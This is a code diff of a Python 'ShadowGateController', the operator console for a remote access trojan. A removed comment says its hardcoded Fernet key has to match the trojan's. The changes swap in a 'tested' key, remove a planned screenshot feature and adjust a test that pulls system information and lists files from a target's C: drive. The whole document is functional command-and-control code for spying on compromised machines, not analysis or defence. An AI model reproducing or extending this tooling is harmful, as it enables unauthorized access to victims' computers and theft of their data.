@@ -13,8 +13,9 @@ class ShadowGateController:
         self.target_ip = None
         self.socket = None
         self.connected = False
-        # CLAVE FIJA - DEBE COINCIDIR CON EL TROYANO
-        self.encryption_key = b'2V6yY4lLf97hB0mKnR8qCw1xZ3zA5eG7dF0jH4sP9rT2uM6vX8cB'  # 44 caracteres
+
+        # 🔑 CLAVE VÁLIDA Y PROBADA - 44 caracteres exactos
+        self.encryption_key = 'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
         self.cipher = Fernet(self.encryption_key)
 
     def connect(self, target_ip):
@@ -108,8 +109,7 @@ class ShadowGateController:
             print("1. 📡 Conectar a objetivo")
             print("2. 🖥️  Información del sistema")
             print("3. 📁 Explorar archivos")
-            print("4. 📷 Capturar pantalla (próximamente)")
-            print("5. 🚪 Desconectar")
+            print("4. 🚪 Desconectar")
             print("0. 🏃 Salir")
             print("=" * 50)
 
@@ -136,10 +136,7 @@ class ShadowGateController:
                 else:
                     print(colored("❌ Error listando archivos", 'red'))
 
-            elif choice == "4" and self.connected:
-                print(colored("📸 Función en desarrollo...", 'yellow'))
-
-            elif choice == "5":
+            elif choice == "4":
                 if self.socket:
                     self.socket.close()
                 self.connected = False
@@ -162,7 +159,6 @@ def test_connection(target_ip):
     controller = ShadowGateController()
 
     if controller.connect(target_ip):
-        # Pruebas básicas
         print("\n🧪 Probando comandos...")
 
         # Systeminfo
@@ -170,16 +166,9 @@ def test_connection(target_ip):
         info = controller.get_system_info()
         if info and info.get('success'):
             print("✅ Systeminfo funcionando")
+            print(info.get('output', '')[:200] + "...")  # Primeros 200 caracteres
         else:
             print("❌ Systeminfo falló")
-
-        # Directorio
-        print("2. Listando C:\\...")
-        files = controller.file_explorer("C:\\")
-        if files and files.get('success'):
-            print("✅ Listado de archivos funcionando")
-        else:
-            print("❌ Listado de archivos falló")
 
         controller.socket.close()
     else:
@@ -190,6 +179,3 @@ if __name__ == "__main__":
     # Ejecutar menú interactivo
     controller = ShadowGateController()
     controller.interactive_menu()
-
-    # O probar conexión directa:
-    # test_connection("192.168.1.100")  # Reemplaza con la IP real
